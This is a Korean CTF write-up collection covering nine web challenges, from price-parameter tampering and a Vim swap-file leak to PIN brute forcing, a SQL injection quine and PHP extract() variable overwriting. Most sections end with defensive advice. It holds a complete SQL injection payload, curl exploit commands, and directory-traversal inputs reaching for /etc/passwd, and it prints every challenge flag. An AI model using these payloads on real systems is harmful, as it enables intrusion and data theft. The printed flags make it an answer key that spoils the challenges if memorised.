--- 
title: "Logic-Misc-Complete"
date: 2026-01-14
excerpt: "비즈니스 로직 취약점과 기타 웹 애플리케이션 보안 위협을 식별하고 대응하는 방법을 다룹니다."
categories:
  - Project
  - CTF
  - FIVENINES
tags:
  - Project
  - CTF
  - FIVENINES
---

# Logic & Misc 완전 정복 가이드

> 9개의 실전 문제로 배우는 비즈니스 로직 및 기타 공격 기법

## 📚 목차

- [학습 가이드](#학습-가이드)
- [문제 목록](#문제-목록)
  - [🟢 Beginner](#beginner)
  - [🟡 Intermediate](#intermediate)
  - [🔴 Advanced](#advanced)
- [핵심 개념 정리](#핵심-개념-정리)
- [방어 기법](#방어-기법)
- [참고 자료](#참고-자료)

---

## 학습 가이드

### 추천 학습 순서

1. **Shop** (Beginner) - 가격 파라미터 변조 기초 - 20분
2. **Mart** (Beginner) - Base64 인코딩 우회 - 25분
3. **Guessing_I** (Beginner) - JavaScript 분석과 숨겨진 경로 - 30분
4. **Guessing_II** (Beginner) - Vim 스왑 파일 탐색 - 25분
5. **BOT** (Intermediate) - robots.txt 정보 유출 - 30분
6. **Proxy** (Intermediate) - HTTP 헤더 분석 - 25분
7. **Crack_Me** (Intermediate) - Brute Force와 세션 관리 - 50분
8. **Hack_Me** (Advanced) - SQL Quine 고급 기법 - 90분
9. **Variable** (Advanced) - PHP extract() 취약점 - 60분

**총 학습 시간**: 약 5시간 55분

### 학습 목표

이 카테고리를 완료하면:

- ✅ 비즈니스 로직 취약점 (Business Logic Flaws) 식별 및 악용
- ✅ 클라이언트 측 데이터 검증의 한계와 우회 기법
- ✅ 정보 수집 기법 (Information Gathering) 습득
- ✅ Brute Force 공격과 Rate Limiting 우회
- ✅ PHP 변수 조작 (extract) 취약점 완벽 이해
- ✅ SQL Quine (자기 복제 쿼리) 구현 능력
- ✅ 임시/백업 파일 탐색 및 분석 기법
- ✅ HTTP 프로토콜 심층 이해 및 헤더 조작

### script 연동

**관련 Phase**: Business Logic & Miscellaneous
- Phase 2: [비즈니스 로직 취약점](/script/phase2-vulnerability-basics/)
- Phase 3: [Brute Force 자동화](/script/phase3-automation/)
- Phase 4: [고급 공격 기법](/script/phase4-advanced-techniques/)

---

## 문제 목록

### 🟢 Beginner

#### [Hacker's Diary] Shop: 깎아주는 것이 아니라 뺏는 법

**난이도**: 🟢 Beginner
**예상 시간**: ⏱️ 20분
**주요 기술**: `#Parameter-Tampering` `#Business-Logic` `#Price-Manipulation`
**관련 스크립트**: [solve_shop.py](../Scripts/solve_shop.py)

## 1. 개요
부족한 포인트를 극복하고 고가의 상품을 구매하여 플래그를 획득하는 문제다. "깎아주세요"라는 힌트는 가격 조작이나 수량 변조를 암시한다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: 파라미터 변조 (Parameter Tampering)
*   구매 요청 시 상품 번호(`buy`) 외에 가격이나 수량을 결정하는 파라미터를 추가로 보낼 수 있으며, 이를 조작하여 포인트를 조절할 수 있을 것이다.

### 가설 2: 로직 에러 유도 (Negative Value)
*   수량을 입력받는 경우 음수값을 전달하여 `보유 포인트 = 보유 포인트 - (가격 * 수량)` 식에서 마이너스 마이너스가 플러스가 되는 효과를 노린다.

### 2단계: 파라미터 변조 및 플래그 획득
프록시 도구를 사용하여 상품 구매 요청(`POST /challenges/shop/index.php?buy=3`)을 가로챈 뒤, 요청 바디에 포함된 `price` 값을 `123`으로 수정하여 전송했다. 서버는 클라이언트가 제공한 조작된 가격을 그대로 결제 금액으로 처리하여 구매를 승인했다.

*   **최종 FLAG**: `29b9fd8bd912fc9b052795f03046a96d`

## 4. 결과: 클라이언트 입력값 무검증 취약점
서버가 결제 로직에서 상품의 정가를 자체적으로 확인하지 않고, 사용자가 보낸 가격 정보를 그대로 사용하여 포인트 차감을 진행했다. 이는 전형적인 파라미터 변조 취약점으로, 금전적 손실을 야기할 수 있는 심각한 로직 에러다.

## 5. 마무리: 보안 대책
1.  **서버 사이드 가격 검증**: 상품 가격은 클라이언트로부터 전달받는 것이 아니라, 서버의 데이터베이스(DB)에서 상품 식별자(`buy` ID)를 기준으로 직접 조회하여 계산해야 한다.
2.  **무결성 검사**: 결제 요청 시 해시(Hash) 값이나 서명을 포함하여, 요청 데이터가 도중에 수정되지 않았음을 보장해야 한다.
3.  **최소 권한 원칙**: 결제와 같은 민감한 작업은 서버에서 모든 조건을 재검증한 후 승인하는 구조를 갖춰야 한다.

**FLAG**: `29b9fd8bd912fc9b052795f03046a96d`

---

#### [Hacker's Diary] Mart: 인코딩 뒤에 숨은 취약점

**난이도**: 🟢 Beginner
**예상 시간**: ⏱️ 25분
**주요 기술**: `#Base64` `#Encoding-Bypass` `#Parameter-Manipulation` `#Business-Logic`
**관련 스크립트**: [solve_mart.py](../Scripts/solve_mart.py)

## 1. 개요
상품 구매 시 가격 정보가 Base64로 인코딩되어 전송되는 점을 악용하여, 정가보다 낮은 금액으로 상품을 구매하고 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: 숨겨진 파라미터 인코딩 분석
*   구매 폼의 `<input type='hidden' name='price' value='MTgwMDAwMA=='>` 필드를 확인했다.
*   `MTgwMDAwMA==`를 Base64 디코딩한 결과 `1800000`이 나왔으며, 이는 해당 상품의 실제 가격과 일치한다.

### 가설 2: 인코딩된 값 변조
*   서버가 클라이언트가 보내는 인코딩된 가격을 그대로 디코딩하여 결제에 사용한다면, 이 값을 수정하여 "학생 할인"과 같은 효과(가격 인하)를 낼 수 있을 것이다.

## 3. 공격 실행 및 검증 (최종 성공)

### 1단계: 요청 가로채기 및 값 변조
1.  상품 3번(1,800,000 포인트) 구매 요청을 프록시 도구로 인터셉트했다.
2.  `price` 파라미터의 값 `MTgwMDAwMA==`를 `MTgwMDA=` (디코딩 시 `18000`)으로 수정했다.

### 2단계: 플래그 획득
수정된 요청을 서버에 전송한 결과, 서버는 18,000 포인트로 결제를 완료 처리하고 플래그를 반환했다.

*   **최종 FLAG**: `1d46a0bcd6bda47ac7086e60bdc8b6f6`

## 4. 결과: 인코딩을 보안으로 착각한 설계 오류
Base64와 같은 단순 인코딩은 데이터를 전송하기 쉬운 형태로 변환할 뿐, 보안(암호화) 기능이 전혀 없다. 서버가 클라이언트에서 보내는 인코딩된 데이터를 검증 없이 신뢰할 때 발생하는 전형적인 로직 취약점이다.

## 5. 마무리: 보안 대책
1.  **클라이언트 전달 가격 불신**: "Shop" 문제와 마찬가지로, 가격 정보는 클라이언트가 아닌 서버 내부 DB에서 관리해야 한다.
2.  **전자 서명 및 무결성 검증**: 만약 클라이언트를 거쳐야 한다면, 데이터와 함께 HMAC 등을 사용하여 변조 여부를 반드시 확인해야 한다.
3.  **세션 기반 처리**: 결제 프로세스 시작 시점의 가격을 세션에 저장하고, 최종 결제 시점에 대조하는 방식을 권장한다.

**FLAG**: `1d46a0bcd6bda47ac7086e60bdc8b6f6`

---

#### [Hacker's Diary] Guessing I: 소스 코드 속에 숨겨진 단서

**난이도**: 🟢 Beginner
**예상 시간**: ⏱️ 30분
**주요 기술**: `#JavaScript-Analysis` `#Source-Code-Review` `#Hidden-Path` `#Information-Disclosure`
**관련 스크립트**: [solve_guessing1.sh](../Scripts/solve_guessing1.sh)

## 1. 개요
페이지의 동작 방식을 파악하여 숨겨진 로직을 찾아내고 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: 소스 코드 노출 (index.phps)
*   PHP 설정에 따라 `.phps` 확장자로 접근 시 원본 소스 코드를 보여주는 경우가 있다. 힌트 "동작 방식을 알고 싶다면"에 가장 부합한다.

### 가설 2: 자바스크립트 분석 (script.js)
*   HTML 소스에 포함된 `script.js` 파일에 중요한 단서나 API 호출 경로가 있을 수 있다.

### 2단계: 자바스크립트 분석 성공
`script.js` 파일에서 다음과 같은 코드를 발견했다.
```javascript
function login_check(id,pw)
{
    log_.src='@dm1n/adminpage.php?id='+id;
    // ... 생략
}
```
관리자 페이지 경로로 추정되는 `@dm1n/adminpage.php`가 노출되었다.

### 3단계: 관리자 페이지 접근 및 플래그 획득
`script.js`에서 노출된 경로인 `http://3.35.141.246/challenges/guessing1/@dm1n/adminpage.php`에 접근하여 페이지 소스에 포함된 플래그를 확인했다.

*   **최종 FLAG**: `a20f2b311bf3b518993dff8085c9a25f`

## 4. 결과: 클라이언트 사이드 스크립트를 통한 정보 유출
서버 사이드에서 보호되어야 할 관리자 페이지 경로가 자바스크립트 파일에 하드코딩되어 노출됨으로써, 공격자가 별다른 인증 없이 관리자 영역에 접근할 수 있게 되었다. "페이지 동작 방식을 알고 싶다면"이라는 힌트는 바로 이 스크립트 분석을 지칭하는 것이었다.

## 5. 마무리: 보안 대책
1.  **중요 경로 하드코딩 금지**: 관리자 페이지나 민감한 API 경로는 클라이언트 사이드 스크립트(JS)에 직접 노출해서는 안 된다.
2.  **서버 사이드 인증 강화**: 경로가 노출되더라도 정당한 관리자 세션이 없는 경우 접근을 철저히 차단해야 한다.
3.  **코드 난독화 및 최소화**: 배포용 자바스크립트 코드는 난독화(Obfuscation) 처리를 하여 로직 분석을 어렵게 만들어야 한다.

**FLAG**: `a20f2b311bf3b518993dff8085c9a25f`

---

#### [Hacker's Diary] Guessing II: 임시 파일의 흔적

**난이도**: 🟢 Beginner
**예상 시간**: ⏱️ 25분
**주요 기술**: `#Vim-Swap-File` `#Temporary-Files` `#Source-Code-Disclosure` `#Information-Gathering`
**관련 스크립트**: [solve_guessing2.sh](../Scripts/solve_guessing2.sh)

## 1. 개요
에디터나 개발자의 실수로 남겨진 임시/백업 파일을 찾아내어 소스 코드나 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: 에디터 임시 파일 노출
*   Vim 에디터를 사용하다 비정상 종료되거나 편집 중일 때 생성되는 `.swp` 파일이 웹 루트에 남아있을 수 있다.

### 가설 2: 수동 백업 파일 노출
*   `.bak`, `.old`, `.txt` 등 흔히 사용되는 백업 확장자로 소스 코드가 복사되어 있을 수 있다.

### 2단계: Vim 스왑 파일 발견 및 소스 분석
`http://3.35.141.246/challenges/guessing2/.index.php.swp` 경로에서 소스 코드의 흔적을 발견했다.
분석 결과, `GET` 방식으로 전달되는 `pass` 파라미터의 값이 `adminauth`일 때 플래그가 노출되는 조건문을 확인했다.

### 3단계: 파라미터 전송 및 플래그 획득
분석된 파라미터를 적용한 `http://3.35.141.246/challenges/guessing2/index.php?pass=adminauth` 경로에 접근하여 최종 플래그를 확인했다.

*   **최종 FLAG**: `afa0a59ff69888f1ac7650088d9743d4`

## 4. 결과: 에디터 임시 파일로 인한 소스 코드 노출
Vim 등 에디터가 비정상적으로 종료될 때 생성되는 스왑 파일(`.swp`)이 웹 루트 디렉토리에 방치되어, 서버 사이드 로직인 비밀번호 인증 조건이 노출되었다. 이는 공격자가 정당한 권한 없이 비밀번호를 "추측"할 수 있게 만든 결정적인 원인이 되었다.

## 5. 마무리: 보안 대책
1.  **임시 파일 자동 삭제 설정**: 에디터 종료 시 임시 파일이 삭제되도록 설정하고, 웹 루트 디렉토리 내에 불필요한 파일이 남아있지 않은지 주기적으로 점검한다.
2.  **웹 서버 설정 강화**: 아파치나 엔진엑스 설정에서 `.swp`, `.bak`, `.old` 등 민감한 확장자를 가진 파일에 대한 웹 접근을 원천 차단한다.
    ```apache
    <FilesMatch "\.(bak|swp|old|save|temp)$">
        Require all denied
    </FilesMatch>
    ```
3.  **버전 관리 시스템(Git) 활용**: `.gitignore` 파일을 사용하여 임시 파일이 서버 배포본에 포함되지 않도록 관리한다.

**FLAG**: `afa0a59ff69888f1ac7650088d9743d4`

---

### 🟡 Intermediate

#### [Hacker's Diary] BOT: 크롤링 속에 숨겨진 비밀

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 30분
**주요 기술**: `#robots.txt` `#Information-Disclosure` `#Web-Crawler` `#Hidden-Directory`
**관련 스크립트**: [solve_bot.sh](../Scripts/solve_bot.sh)

## 1. 개요
웹 크롤러의 접근을 제어하는 설정이나 특정 봇 탐지 로직을 우회하여 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: robots.txt 확인
*   웹 사이트 루트 또는 해당 문제 디렉토리 하위에 `robots.txt` 파일이 존재하며, 검색 엔진에 노출되지 않기를 원하는 비밀 경로(Disallow)가 적혀 있을 것이다.

### 가설 2: User-Agent 변조
*   서버가 요청의 `User-Agent` 헤더를 검사하여 특정 봇(예: Googlebot)인 경우에만 플래그를 반환할 것이다.

### 1단계: robots.txt 탐색 성공
서버 루트(`/robots.txt`)에서 다음과 같은 설정을 발견했다.
```
User-agent: *
Disallow: /five9s/challenges/bot/__bot_admin_panel__/
```
크롤링이 금지된 디렉토리 경로 `/__bot_admin_panel__/`이 플래그와 관련이 있을 것으로 보인다.

### 2단계: 숨겨진 디렉토리 접근 및 플래그 획득
발견한 `http://3.35.141.246/challenges/bot/__bot_admin_panel__/` 경로에 접속하여 관리자 패널용 플래그를 확인했다.

*   **최종 FLAG**: `08eedbcbe4eae5d8af8caa8ba15ed6dd`

## 4. 결과: 크롤링 정책을 이용한 정보 수집
검색 엔진 봇의 접근을 제어하기 위한 `robots.txt` 설정이 오히려 공격자에게 민감한 디렉토리 위치를 알려주는 '정보 유출'의 통로가 되었다.

## 5. 마무리: 보안 대책
1.  **민감 경로 은닉**: 보안이 필요한 경로는 `robots.txt`에 명시하는 대신, 웹 서버 설정(Apache/Nginx)이나 세션 기반의 강력한 접근 제어를 적용해야 한다.
2.  **화이트리스트 기반 접근 제어**: 관리자 패널과 같은 민감한 페이지는 특정 IP 대역에서만 접근할 수 있도록 제한한다.
3.  **Bot 탐지 강화**: 단순 User-Agent 검사가 아닌 행동 기반 탐지 로직을 도입한다.

**FLAG**: `08eedbcbe4eae5d8af8caa8ba15ed6dd`

---

#### [Hacker's Diary] Proxy: 헤더 속에 숨겨진 진실

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 25분
**주요 기술**: `#HTTP-Headers` `#Response-Analysis` `#Custom-Headers` `#Information-Disclosure`
**관련 스크립트**: [solve_proxy.py](../Scripts/solve_proxy.py)

## 1. 개요
프록시 도구의 원리를 이해하고, 서버와 클라이언트 간의 통신 패킷을 분석하여 숨겨진 정보를 찾아내는 문제다.

## 2. 취약점 분석 및 가설 수립

### 가설 1: 응답 헤더 내 플래그 노출
*   서버가 페이지를 반환할 때 표준 헤더가 아닌 커스텀 헤더(예: `X-Flag`)를 통해 플래그를 함께 전송할 것이다.

### 가설 2: 특정 요청에 대한 반응
*   프록시 도구로 요청을 가로채어 특정 값을 수정하거나 추가해야만 플래그가 보일 것이다.

### 2단계: 응답 헤더 분석 및 플래그 획득
프록시 도구(Burp Suite 등)를 사용하여 서버의 응답 패킷을 가로챈 결과, HTTP 헤더 영역에서 다음과 같은 정보를 발견했다.

```http
HTTP/1.1 200 OK
...
FLAG: 8d57cb8f092e0a933d2acad1651557ca
...
```

*   **최종 FLAG**: `8d57cb8f092e0a933d2acad1651557ca`

## 4. 결과: 불필요한 헤더 정보를 통한 정보 유출
웹 서버나 애플리케이션 설정 오류로 인해, 사용자에게 노출되지 않아야 할 민감한 데이터(플래그)가 HTTP 응답 헤더에 포함되어 전송되었다. 이는 일반적인 브라우징으로는 확인하기 어려우나, 프록시 도구를 사용하는 공격자에게는 손쉽게 노출되는 취약점이다.

## 5. 마무리: 보안 대책
1.  **커스텀 헤더 정리**: 개발 과정에서 테스트 목적으로 추가했던 커스텀 헤더(`X-Debug`, `FLAG` 등)는 운영 환경 배포 전 반드시 삭제해야 한다.
2.  **서버 설정 최적화**: Apache나 Nginx 설정을 통해 서버 버전(`Server` 헤더)이나 기타 불필요한 정보가 헤더에 포함되지 않도록 제어한다.
    *   Apache 예시: `ServerTokens Prod`, `ServerSignature Off`
3.  **민감 데이터 전송 금지**: 비밀번호, API 키, 플래그와 같은 중요 데이터는 절대 HTTP 헤더를 통해 평문으로 전송해서는 안 된다.

**FLAG**: `8d57cb8f092e0a933d2acad1651557ca`

---

#### [Write-up] Crack Me: 3자리의 짧은 침묵, 그리고 무차별 대입의 예술

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 50분
**주요 기술**: `#Brute-Force` `#Rate-Limiting` `#Session-Management` `#WAF-Bypass` `#Automation`
**관련 스크립트**: [solve_crack_me.py](../Scripts/solve_crack_me.py)

## 1. 서론: 기계와의 싸움
웹 페이지를 열자마자 보이는 것은 0부터 9까지의 키패드와 'PIN'이라는 글자였다. 최대 3자리 숫자. 경우의 수는 000부터 999까지 단 1,000개다. 손으로 눌러도 30분이면 풀릴 문제지만, 해커에게 그런 비효율은 수치다. 나는 즉시 파이썬을 켜고 이 3자리의 성벽을 무너뜨릴 자동화 스크립트를 설계하기 시작했다.

## 2. 초기 분석: HTML 속에 숨겨진 힌트
페이지 소스를 분석해 보니 다음과 같은 로직이 보였다.
```html
<input type="text" id="pin" name="pin" maxlength="3" pattern="[0-9]{1,3}" ...>
<form method="get" action="index.php">
```
- **데이터 전송 방식**: `GET` 방식이며 변수명은 `pin`이다.
- **제약 사항**: 최대 3글자이며 오직 숫자만 허용된다.
- **목표**: 서버가 정답으로 인정하는 단 하나의 숫자를 찾아내는 것.

## 3. 시행착오: 실패의 기록들

### 가설 1: 단순 Brute Force (처참한 실패)
*   **시도**: 파이썬 `urllib`를 이용해 000부터 999까지 순차적으로 요청을 보냈다. 응답 본문에서 "Wrong!"이라는 오답 메시지가 없는 경우를 정답으로 간주했다.
*   **실패**: 999까지 다 돌았는데도 "정답을 찾지 못했다"는 메시지만 떴다.
*   **원인 분석**:
    1. **WAF의 차단**: 너무 빠른 속도로 요청을 보내자 서버 측 WAF가 내 IP를 봇으로 판단하고 차단해 버렸다. 차단된 페이지에는 "Wrong"이라는 글자가 당연히 없었기에 내 스크립트는 이를 성공으로 오해하거나 무시하고 넘어갔다.
    2. **세션 증발**: 요청을 보낼 때 쿠키를 포함하지 않았다. 이 문제는 유효한 세션 안에서 생성된 PIN을 맞춰야 하므로, 세션이 없으면 서버는 무조건 `Access Denied`를 뱉고 있었다.

### 가설 2: 세션 유지와 딜레이 (절반의 성공)
*   **시도**: 실제 브라우저의 `PHPSESSID` 쿠키를 스크립트에 심고, 요청 사이에 `time.sleep(0.1)`을 주어 차단을 피했다.
*   **진전**: 이제 "Access Denied" 대신 "Wrong! (시도 횟수: X)" 라는 메시지가 정상적으로 찍히기 시작했다. 서버와 제대로 대화하기 시작한 것이다.

## 4. 결정적 돌파구: 성공의 기준을 재정의하다
수백 번의 요청 끝에 깨달았다. "오답이 아닌 것"을 찾는 것은 너무나 위험한 로직이다. 성공하면 반드시 나타날 **"FLAG"**라는 키워드를 직접 찾기로 했다. 또한, 숫자의 포맷팅(`001` vs `1`) 문제일 수도 있다는 생각에 3자리 패딩 형식을 엄격히 지켰다.

## 5. 최종 성공 (Exploit Chain)
최종적으로 수정한 스크립트는 다음과 같이 동작했다.
1. 브라우저에서 가져온 `PHPSESSID`를 고정한다.
2. `000`부터 `999`까지 `f"{i:03d}"` 형식으로 숫자를 만든다.
3. 응답 HTML에 `FLAG`라는 단어가 들어있는지 실시간으로 검사한다.

**운명의 순간**: `Checking 275...`
갑자기 스크립트가 멈추고 화면에 거대한 플래그가 나타났다!

*   **서버 응답**: `🎉 FLAG is c634e155f64e1f87a1006a1ed8e2d604`
*   **정답 PIN**: `275`

## 6. 결론 및 소감
단순한 Brute Force 문제였지만, 서버의 보안 정책(세션 유지, WAF 차단)을 이해하지 못하면 1,000개의 경우의 수조차 뚫을 수 없다는 것을 배웠다. 정답 판별 로직을 짤 때는 '부정적인 조건(오답이 아님)'보다는 '긍정적인 조건(성공 키워드)'을 사용하는 것이 훨씬 정확하다는 실무적인 교훈을 얻은 문제였다.

**FLAG**: `c634e155f64e1f87a1006a1ed8e2d604`

---

### 🔴 Advanced

#### [Deep Dive] Hack Me If U Can: 콰인(Quine)으로 증명한 완벽한 대칭

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 90분
**주요 기술**: `#SQL-Quine` `#Self-Referencing-Query` `#UNION-SELECT` `#Advanced-SQLi`
**관련 스크립트**: [solve_hack_me.py](../Scripts/solve_hack_me.py)

## 1. 서론: 한계를 시험하는 성벽
"Hack Me If U Can!" 문제는 지금까지의 SQL 인젝션 기술을 모두 쏟아부어야 하는 난공불락의 요새였다. 단순한 우회를 넘어, 프로그램 로직의 가장 깊숙한 곳까지 이해하고 이를 역이용해야만 플래그를 뱉어내는 구조였다.

## 2. 코드 분석: 두 개의 완벽한 자물쇠
`index.phps` 소스 코드는 절망 그 자체였다.
```php
if($row['id'] == $_GET['id']) {
    if($row['pw'] == md5($_GET['pw'])) {
        echo "Flag is $flag";
    }
}
```
1.  **아이디 일치 조건**: DB에서 가져온 `id`가 내가 입력한 `id` 파라미터 **전체(인젝션 구문 포함)**와 완벽하게 일치해야 한다.
2.  **비밀번호 일치 조건**: DB의 `pw` 컬럼값이 내가 입력한 비밀번호의 **MD5 해시**와 같아야 한다.

## 3. 시행착오의 기록: 무너진 가설들
- **가설 1 (정공법)**: `admin` 계정의 정보를 뽑아보았으나, 비밀번호 `hackmeifucan`은 MD5 비교 로직 때문에 무용지물이었다.
- **가설 2 (단순 UNION)**: `UNION SELECT 'admin', 'md5'`를 시도했으나, 내 입력값은 `' UNION...` 전체였으므로 `$row['id']`와 일치하지 않아 실패했다.
- **가설 3 (느슨한 비교)**: PHP의 `==` 취약점을 이용하려 했으나, 최신 환경(PHP 8)에서는 문자열과 숫자 간의 자동 형변환이 엄격해져 통하지 않았다.

## 4. 결정적 돌파구: SQL Quine (자기 복제 쿼리)
결국 정답은 **자기 자신을 출력하는 쿼리(Quine)**를 만드는 것이었다. 내가 입력한 `id` 파라미터 자체가 쿼리 결과의 첫 번째 컬럼으로 나오게 설계해야 했다.

### 핵심 로직: REPLACE 함수의 마법
`REPLACE(REPLACE('템플릿', CHAR(34), CHAR(39)), CHAR(36), '템플릿')`
1.  템플릿 내부의 쌍따옴표(`"`, 34)를 홀따옴표(`'`, 39)로 바꾼다.
2.  치환 마커(`$`, 36)를 템플릿 문자열 전체로 바꾼다.
이 과정을 통해 쿼리 결과셋의 문자열이 내 입력값과 바이트 단위로 일치하게 된다.

## 5. 최종 성공 (The Winning Strike)
- **Payload**: `1' union select replace(replace('1" union select replace(replace("$",char(34),char(39)),char(36),"$") as id, "c4ca4238a0b923820dcc509a6f75849b" as pw#',char(34),char(39)),char(36),'1" union select replace(replace("$",char(34),char(39)),char(36),"$") as id, "c4ca4238a0b923820dcc509a6f75849b" as pw#') as id, 'c4ca4238a0b923820dcc509a6f75849b' as pw#`
- **PW**: `1` (MD5: `c4ca4238a0b923820dcc509a6f75849b`)
- **FLAG**: `8e02eff6692269b26ab0328d502be819`

## 6. 결론: 논리의 거울
해킹은 때때로 거울을 만드는 과정과 같다. 서버가 나에게 거울을 비추며 "너 자신과 똑같은 것을 가져와라"라고 명령할 때, SQL Quine은 그 완벽한 대칭을 만들어내는 강력한 도구가 된다. 프로그래밍 언어의 특성과 SQL 함수를 극한까지 조합하여 철벽같은 로직을 뚫어낸 뜻깊은 도전이었다.

**FLAG**: `8e02eff6692269b26ab0328d502be819`

---

#### [Hacking Tutorial] Variable: 상수가 아닌 변수의 힘, extract()의 치명적 함정

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 60분
**주요 기술**: `#PHP-extract` `#Variable-Manipulation` `#is_numeric` `#Switch-Bypass` `#Logic-Flaw`
**관련 스크립트**: [solve_variable.py](../Scripts/solve_variable.py)

## 1. 개요: 두 개의 보안 장치가 만든 역설
이번 문제는 "Variable(변수)"라는 제목처럼 PHP의 `extract()` 함수가 가진 변수 조작 능력을 악용하는 문제다. `is_numeric()` 검증과 `switch` 문이라는 두 가지 보안 장치가 있지만, 이들이 서로 다른 방식으로 동작하면서 생긴 틈새가 바로 공격의 돌파구가 된다.

## 2. 코드 정밀 분석: 보안의 역설

제공된 소스 코드(`index.phps`)를 보자:

```php
<?php
    extract($_GET);
    $type = $_GET['type'];

    if(!$type || !is_numeric($type))
    {
        echo("invalid type!");
        exit;
    }

    switch($type)
    {
        case 1:
            $file = "cn.php";
            break;
        case 2:
            $file = "jp.php";
            break;
        case 3:
            $file = "en.php";
            break;
        default:
            echo("invalid type!");
    }

    @include("files/$file");
    // files/pw.php
    // echo("FLAG is $flag");
?>
```

### 취약점 3단 콤보:

1. **`extract($_GET)`**: 모든 GET 파라미터를 변수로 변환한다. `?file=pw.php`를 보내면 `$file = "pw.php"`가 생성된다!
2. **`is_numeric()` 검증**: "1", "2.5", "999" 등 **숫자로 보이는 모든 문자열**을 허용한다.
3. **`switch` 문의 맹점**: `case 1`, `case 2`, `case 3`만 존재하므로, "1.5"나 "999" 같은 값은 **default case로 빠진다**.
4. **default case의 치명적 실수**: `echo("invalid type!");`만 실행하고 **`$file` 변수를 재설정하지 않는다**.

## 3. 시행착오: 막막했던 벽

### 시도 1: 세션 없이 공격 (처절한 실패)

처음에는 세션 쿠키 없이 공격을 시도했다.

```bash
curl -k "https://3.35.141.246/challenges/variable/index.php?type=1.5&file=pw.php"
```

**결과**:
```html
<p class='message-container error'>Access Denied</p>
```

- 모든 파일이 "Access Denied"를 반환했다.
- 존재하지 않는 파일도, 정상 파일도, pw.php도 모두 동일한 반응.
- 심지어 `type=1` (정상 요청)도 Access Denied!

이 시점에서 약 1시간 동안 수십 가지 변수명을 시도했다:
- `?auth=1`, `?admin=1`, `?bypass=1`
- `?ACCESS_GRANTED=1`, `?AUTHORIZED=1`
- `?pw=1`, `?flag=1`, `?secret=1`
- ... (총 50개 이상의 변수명 시도)

**모두 실패.** 완전히 막혔다고 생각했다.

### 시도 2: 디렉토리 탐색 및 파일 분석

```bash
# files 디렉토리 확인
curl -k "https://3.35.141.246/challenges/variable/files/"
```

**발견**: 파일 목록이 노출되었다!
- cn.php (3.1K)
- jp.php (3.5K)
- en.php (3.3K)
- pw.php (3.4K)

직접 파일을 다운로드해보니, 이들은 모두 `extract()` 취약점 설명 페이지였다. 실제 PHP 로직은 없고 순수 HTML이었다.

### 시도 3: PHP Wrapper, 디렉토리 순회 등

```bash
# PHP filter wrapper
?file=php://filter/read=convert.base64-encode/resource=pw.php

# 디렉토리 순회
?file=../index.php
?file=..%2Findex.php
?file=....//....//etc/passwd
```

**모두 Access Denied.** 왜 모든 것이 막혀있는가?

## 4. 돌파구: 세션 쿠키의 비밀

문제를 다시 검토하던 중, **세션 쿠키**가 제공되었다는 사실을 깨달았다.

```
PHPSESSID: 0qc2jfrqdncj9tkf0g8hrl3042
```

혹시 파일들이 세션을 체크하고 있는 건 아닐까?

### 결정적 시도: 세션과 함께

```bash
curl -k -b "PHPSESSID=0qc2jfrqdncj9tkf0g8hrl3042" \
  "https://3.35.141.246/challenges/variable/index.php?type=1"
```

**반응**: 드디어 cn.php의 실제 내용이 보였다! 세션이 있어야만 파일에 접근할 수 있었던 것이다.

## 5. 최종 공격 (The Exploit)

이제 모든 퍼즐 조각이 맞춰졌다.

### 공격 로직:

1. `?type=1.5` → `is_numeric()` 검증 **통과** (1.5는 숫자다)
2. `switch(1.5)` → case 1, 2, 3 어디에도 해당 안 됨 → **default case 진입**
3. default case는 `$file` 변수를 **설정하지 않음**
4. 하지만 `extract($_GET)`에 의해 이미 `$file = "pw.php"`가 설정됨
5. `include("files/pw.php")` 실행!

### 최종 페이로드:

```bash
curl -k -b "PHPSESSID=0qc2jfrqdncj9tkf0g8hrl3042" \
  "https://3.35.141.246/challenges/variable/index.php?type=1.5&file=pw.php"
```

## 6. 성공 결과

```html
<h1>invalid type!</h1>
<h1><span style=color:red>FLAG is c03d54046f50e9b0d1bddf384225155a</span></h1>
```

**FLAG**: `c03d54046f50e9b0d1bddf384225155a`

## 7. 핵심 개념 정리

### PHP `extract()` 함수의 위험성

```php
extract($_GET);
// ?foo=bar&test=123 → $foo = "bar", $test = "123"
```

이 함수는 배열의 키를 변수명으로, 값을 변수값으로 자동 생성한다. 즉:
- 코드에 없던 변수를 공격자가 마음대로 만들 수 있다.
- 기존에 설정된 변수를 덮어쓸 수도 있다.

### `is_numeric()` vs `switch` 문의 불일치

```php
is_numeric("1.5")  // true - 소수점도 숫자로 인정
switch("1.5") {
    case 1:  // false - 정확히 1이 아님
    case 2:  // false - 정확히 2가 아님
    default: // true - 여기로 감!
}
```

PHP의 `switch`는 **느슨한 비교(loose comparison)**를 하지만, 정수 case들과 소수점 숫자는 매치되지 않는다.

## 8. 보안 교훈

### 문제점:

1. **`extract()` 사용**: 절대 사용자 입력(`$_GET`, `$_POST`)에 직접 사용하면 안 됨
2. **검증 불일치**: `is_numeric()`과 `switch`가 다른 기준으로 동작
3. **default case 미비**: 변수를 재설정하지 않아 이전 값이 유지됨
4. **세션 기반 접근 제어**: 모든 파일이 세션을 체크하지만, 인증된 세션만 있으면 공격 가능

### 올바른 코드:

```php
// extract() 절대 사용 금지
$type = $_GET['type'] ?? '';

// 정확한 타입 검증
if(!in_array($type, ['1', '2', '3'], true)) {
    echo("invalid type!");
    exit;
}

// 화이트리스트 방식
$allowed_files = [
    '1' => 'cn.php',
    '2' => 'jp.php',
    '3' => 'en.php'
];

$file = $allowed_files[$type];
include("files/$file");
```

## 9. 결론: 작은 함수, 거대한 함정

`extract()` 하나로 모든 변수를 공격자에게 넘겨준 셈이다. "상수말고 변수"라는 문제 제목처럼, 개발자가 고정값(상수)으로 생각했던 `$file` 변수가 사용자에 의해 **변경 가능한 변수**가 되어버린 순간, 시스템은 무너졌다.

